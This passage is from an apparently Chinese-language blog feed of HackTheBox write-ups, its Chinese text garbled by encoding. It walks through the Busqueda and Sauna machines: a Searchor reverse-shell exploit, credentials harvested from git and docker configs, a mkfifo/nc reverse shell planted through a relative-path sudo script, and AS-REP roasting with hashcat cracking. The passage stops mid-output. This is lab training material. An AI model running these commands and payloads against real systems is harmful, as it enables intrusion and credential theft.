<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>&#x2F;home&#x2F;m4lwhere&#x2F;user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Busqueda</title>
    <url>/Hackthebox/htb/htb-busqueda/</url>
    <content><![CDATA[<style>.bagcacgpbofw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-busqueda/a6942ab57b6a79f71240420442027334.png" class="bagcacgpbofw">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.208  <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-23 <span class="token number">10</span>:49 CST
Warning: <span class="token number">10.10</span>.11.208 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.208
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.15s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65507</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, <span class="token number">26</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.9p1 Ubuntu 3ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">81</span>:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.52
<span class="token operator">|</span>_http-title: Did not follow redirect to http://searcher.htb/
<span class="token operator">|</span>_http-server-header: Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: Host: searcher.htb<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">127.64</span> seconds
</code></pre>

<p>è®¿é—®80ç«¯å£ï¼Œè‡ªåŠ¨è·³è½¬åˆ°<code>http://searcher.htb</code> ,æ·»åŠ æœ¬åœ°åŸŸåè§£æ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.11.208  searcher.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<p>æŠ“åŒ…è§¦å‘æŠ¥é”™ï¼Œåœ¨æŠ¥é”™ä¿¡æ¯ç§å¯ä»¥æ‰¾åˆ°ç‰ˆæœ¬å·</p>
<img src="/Hackthebox/htb/htb-busqueda/image-20250323111357967.png" class="" title="burp">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>é€šè¿‡æ‰¾åˆ°çš„ç‰ˆæœ¬å·æ£€ç´¢æ¼æ´</p>
<img src="/Hackthebox/htb/htb-busqueda/image-20250324112347626.png" class="" title="exp">

<pre class="language-bash" data-language="bash"><code class="language-bash">$ ./exploit.sh searcher.htb <span class="token number">10.10</span>.16.39 <span class="token number">9001</span>  
---<span class="token punctuation">[</span>Reverse Shell Exploit <span class="token keyword">for</span> Searchor <span class="token operator">&lt;=</span> <span class="token number">2.4</span>.2 <span class="token punctuation">(</span><span class="token number">2.4</span>.0<span class="token punctuation">)</span><span class="token punctuation">]</span>---
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Input target is searcher.htb
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Input attacker is <span class="token number">10.10</span>.16.39:9001
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Run the Reverse Shell<span class="token punctuation">..</span>. Press Ctrl+C after successful connection
</code></pre>

<p>æˆåŠŸåå¼¹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span> 
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9001</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.208<span class="token punctuation">]</span> <span class="token number">47162</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1620</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
svc@busqueda:/var/www/app$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>svc<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>svc<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>svc<span class="token punctuation">)</span>
svc@busqueda:/var/www/app$ 
</code></pre>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>åœ¨&#x2F;var&#x2F;www&#x2F;app&#x2F;.git&#x2F;configä¸­å¯ä»¥æ‰¾åˆ°ç”¨æˆ·åå¯†ç å’Œæ–°çš„åŸŸå</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">svc@busqueda:/var/www/app/.git$ <span class="token function">cat</span> config
<span class="token function">cat</span> config
<span class="token punctuation">[</span>core<span class="token punctuation">]</span>
	repositoryformatversion <span class="token operator">=</span> <span class="token number">0</span>
	filemode <span class="token operator">=</span> <span class="token boolean">true</span>
	bare <span class="token operator">=</span> <span class="token boolean">false</span>
	logallrefupdates <span class="token operator">=</span> <span class="token boolean">true</span>
<span class="token punctuation">[</span>remote <span class="token string">"origin"</span><span class="token punctuation">]</span>
	url <span class="token operator">=</span> http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch <span class="token operator">=</span> +refs/heads/*:refs/remotes/origin/*
<span class="token punctuation">[</span>branch <span class="token string">"main"</span><span class="token punctuation">]</span>
	remote <span class="token operator">=</span> origin
	merge <span class="token operator">=</span> refs/heads/main</code></pre>

<p>,æ·»åŠ æœ¬åœ°åŸŸåè§£æ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"10.10.11.208 gitea.searcher.htb"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨è·å–åˆ°çš„å¯†ç å’Œsvcç”¨æˆ·ç™»å½•sshï¼Œå‘ç°å¯ä»¥ç™»å½•æˆåŠŸï¼ŒæŸ¥æ‰¾sudo é…ç½®ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªPythonè„šæœ¬</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> <span class="token function">ssh</span> svc@10.10.11.208
The authenticity of <span class="token function">host</span> <span class="token string">'10.10.11.208 (10.10.11.208)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">10.10</span>.11.208<span class="token string">' (ED25519) to the list of known hosts.
svc@10.10.11.208'</span>s password: 
Welcome to Ubuntu <span class="token number">22.04</span>.2 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.15</span>.0-69-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
The list of available updates is <span class="token function">more</span> than a week old.
To check <span class="token keyword">for</span> new updates run: <span class="token function">sudo</span> <span class="token function">apt</span> update

Last login: Tue Apr  <span class="token number">4</span> <span class="token number">17</span>:02:09 <span class="token number">2023</span> from <span class="token number">10.10</span>.14.19
svc@busqueda:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> svc: 
Matching Defaults entries <span class="token keyword">for</span> svc on busqueda:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /usr/bin/python3 /opt/scripts/system-checkup.py *</code></pre>

<p>å°è¯•è¿è¡Œè„šæœ¬ï¼Œæ”¯æŒä¸‰ä¸ªå‘½ä»¤</p>
<pre class="language-none"><code class="language-none">svc@busqueda:&#x2F;opt&#x2F;scripts$ sudo &#x2F;usr&#x2F;bin&#x2F;python3  &#x2F;opt&#x2F;scripts&#x2F;system-checkup.py *
Usage: &#x2F;opt&#x2F;scripts&#x2F;system-checkup.py &lt;action&gt; (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup</code></pre>

<p>ä½¿ç”¨ docker-inspect æŸ¥æ‰¾ç¯å¢ƒé…ç½®ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€æ¡å¯†ç </p>
<pre class="language-none"><code class="language-none">svc@busqueda:~$ sudo &#x2F;usr&#x2F;bin&#x2F;python3  &#x2F;opt&#x2F;scripts&#x2F;system-checkup.py docker-inspect &#39;&#123;&#123;json .&#125;&#125;&#39; gitea | jq

&lt;...&gt;
&quot;Env&quot;: [
      &quot;USER_UID&#x3D;115&quot;,
      &quot;USER_GID&#x3D;121&quot;,
      &quot;GITEA__database__DB_TYPE&#x3D;mysql&quot;,
      &quot;GITEA__database__HOST&#x3D;db:3306&quot;,
      &quot;GITEA__database__NAME&#x3D;gitea&quot;,
      &quot;GITEA__database__USER&#x3D;gitea&quot;,
      &quot;GITEA__database__PASSWD&#x3D;yuiu1hoiu4i5ho1uh&quot;,
      &quot;PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;,
      &quot;USER&#x3D;git&quot;,
      &quot;GITEA_CUSTOM&#x3D;&#x2F;data&#x2F;gitea&quot;
    ],
    &quot;Cmd&quot;: [
      &quot;&#x2F;bin&#x2F;s6-svscan&quot;,
      &quot;&#x2F;etc&#x2F;s6&quot;
    ],
    &quot;Image&quot;: &quot;gitea&#x2F;gitea:latest&quot;,
&lt;...&gt;</code></pre>

<p>å…ˆä½¿ç”¨cody ç™»å½•gitea å¯ä»¥æ‰¾åˆ°å¦ä¸€ä¸ªç”¨æˆ·æ˜¯administratorï¼Œä½¿ç”¨æ‰¾åˆ°çš„å¯†ç ç™»å½•gitea  administratorï¼šyuiu1hoiu4i5ho1uh</p>
<img src="/Hackthebox/htb/htb-busqueda/image-20250323132554909.png" class="" title="code review">

<p>åˆ†æä»£ç Â·<code> arg_list = [&#39;./full-checkup.sh&#39;]</code>  ä½¿ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„</p>
<pre class="language-Python" data-language="Python"><code class="language-Python">#!&#x2F;bin&#x2F;bash
import subprocess
import sys

actions &#x3D; [&#39;full-checkup&#39;, &#39;docker-ps&#39;,&#39;docker-inspect&#39;]

def run_command(arg_list):
    r &#x3D; subprocess.run(arg_list, capture_output&#x3D;True)
    if r.stderr:
        output &#x3D; r.stderr.decode()
    else:
        output &#x3D; r.stdout.decode()

    return output


def process_action(action):
    if action &#x3D;&#x3D; &#39;docker-inspect&#39;:
        try:
            _format &#x3D; sys.argv[2]
            if len(_format) &#x3D;&#x3D; 0:
                print(f&quot;Format can&#39;t be empty&quot;)
                exit(1)
            container &#x3D; sys.argv[3]
            arg_list &#x3D; [&#39;docker&#39;, &#39;inspect&#39;, &#39;--format&#39;, _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)
            exit(1)
    
        except Exception as e:
            print(&#39;Something went wrong&#39;)
            exit(1)
    
    elif action &#x3D;&#x3D; &#39;docker-ps&#39;:
        try:
            arg_list &#x3D; [&#39;docker&#39;, &#39;ps&#39;]
            print(run_command(arg_list)) 
        
        except:
            print(&#39;Something went wrong&#39;)
            exit(1)

    elif action &#x3D;&#x3D; &#39;full-checkup&#39;:
        try:
            arg_list &#x3D; [&#39;.&#x2F;full-checkup.sh&#39;]
            print(run_command(arg_list))
            print(&#39;[+] Done!&#39;)
        except:
            print(&#39;Something went wrong&#39;)
            exit(1)
            

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:

    try:
        action &#x3D; sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f&#39;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#39;)
        print(&#39;&#39;)
        print(&#39;     docker-ps     : List running docker containers&#39;)
        print(&#39;     docker-inspect : Inpect a certain docker container&#39;)
        print(&#39;     full-checkup  : Run a full system checkup&#39;)
        print(&#39;&#39;)
        exit(1)</code></pre>

<p>ä½¿ç”¨nano åœ¨&#x2F;tmp åˆ›å»ºfull-checkup.sh </p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">10.10</span>.16.39 <span class="token number">9009</span> <span class="token operator">></span>/tmp/f</code></pre>

<p>æ·»åŠ æ‰§è¡Œæƒé™ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">svc@busqueda:/tmp$ <span class="token function">chmod</span> +x full-checkup.sh 
svc@busqueda:/tmp$ <span class="token function">sudo</span> /usr/bin/python3  /opt/scripts/system-checkup.py full-checkup</code></pre>

<p>Getshell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9009</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9009</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.208<span class="token punctuation">]</span> <span class="token number">36396</span>
<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
<span class="token comment"># cat /root/root.txt</span>
</code></pre>

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>&#x2F;home&#x2F;svc&#x2F;user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>å¯†ç é‡ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Sauna</title>
    <url>/Hackthebox/htb/htb-sauna/</url>
    <content><![CDATA[<style>.qrojcxithabx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-sauna/f31d5d0264fadc267e7f38a9d7729d14.png" class="qrojcxithabx">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span>  
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-22 <span class="token number">15</span>:19 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.175
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65515</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="token operator">|</span>_http-title: Egotistical Bank :: Home
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2025</span>-03-22 <span class="token number">14</span>:03:56Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49673</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49674</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49677</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49695</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49717</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-22T14:04:50
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_clock-skew: 6h41m33s
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">278.88</span> seconds
</code></pre>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>è®¿é—®80ç«¯å£å‘ç°ä¸€ä¸ªç½‘ç«™ï¼Œåœ¨&#x2F;about ä¸Šå¯ä»¥çœ‹åˆ°ä¸€äº›ç”¨æˆ·å</p>
<img src="/Hackthebox/htb/htb-sauna/image-20250322153810191.png" class="" title="ç”¨æˆ·åæ”¶é›†">



<p>æ”¶é›†é¡µé¢ä¸Šçš„ç”¨æˆ·å</p>
<pre class="language-none"><code class="language-none">Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb</code></pre>

<p>æ ¹æ®ç”¨æˆ·åé‡æ–°ç”Ÿæˆç”¨æˆ·åç»„åˆ</p>
<pre class="language-none"><code class="language-none">$ .&#x2F;username-anarchy --input-file user.txt --select-format first,flast,first.last firstl &gt; username.txt    </code></pre>

<pre class="language-none"><code class="language-none">firstl
fergus
fergus.smith
fsmith
shaun
shaun.coins
scoins
hugo
hugo.bear
hbear
bowie
bowie.taylor
btaylor
sophie
sophie.driver
sdriver
steven
steven.kerb
skerb</code></pre>

<h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>ä½¿ç”¨ impacket-GetNPUsers </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-usersfile</span> username.txt -no-pass 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477d158ddd194616ff3f5568be1a<span class="token variable">$30b7b9edf20400313d31252b04ee37223a106f79c2d7432fe6f0bf421560f31c7fc566ae368e479428ae09f12a5f86926427ac033248ff05f0ef514574ebd4721f533c79add45bd1b010903e58fb3aeca94f58333811b69ef70346ad227828e5fa36a7d54f4534c51830e7746b5ae87c75dc5c9c4813161eda621fec33235f4872488395fb674c0a154d4fe83892cb301bbaefcef1c3c4ff287e2a4f7903807d08694adcf89d7eb820afaf3ab45440ff68b1bb99385cc8ded853bce4908e7b1e1d669d9f82aca5020be559f060559e78828f3f33c48a4051aef7b8316caa375498b544290d032baf45db2d62e0779ee44f9fb0589ec46f44418ecc0399b16703</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>ä½¿ç”¨hashcat ç ´è§£</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">18200</span> <span class="token builtin class-name">hash</span> /usr/share/wordlists/rockyou.txt
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting

<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Watchdog: Temperature abort trigger <span class="token builtin class-name">set</span> to 90c

Host memory required <span class="token keyword">for</span> this attack: <span class="token number">52</span> MB

Dictionary cache hit:
* Filename<span class="token punctuation">..</span>: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="token number">14344385</span>
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921507</span>
* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344385</span>

<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477d158ddd194616ff3f5568be1a<span class="token variable">$30b7b9edf20400313d31252b04ee37223a106f79c2d7432fe6f0bf421560f31c7fc566ae368e479428ae09f12a5f86926427ac033248ff05f0ef514574ebd4721f533c79add45bd1b010903e58fb3aeca94f58333811b69ef70346ad227828e5fa36a7d54f4534c51830e7746b5ae87c75dc5c9c4813161eda621fec33235f4872488395fb674c0a154d4fe83892cb301bbaefcef1c3c4ff287e2a4f7903807d08694adcf89d7eb820afaf3ab45440ff68b1bb99385cc8ded853bce4908e7b1e1d669d9f82aca5020be559f060559e78828f3f33c48a4051aef7b8316caa375498b544290d032baf45db2d62e0779ee44f9fb0589ec46f44418ecc0399b16703</span>:Thestrokes23
                                                          
Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">18200</span> <span class="token punctuation">(</span>Kerberos <span class="token number">5</span>, etype <span class="token number">23</span>, AS-REP<span class="token punctuation">)</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477<span class="token punctuation">..</span>.b16703
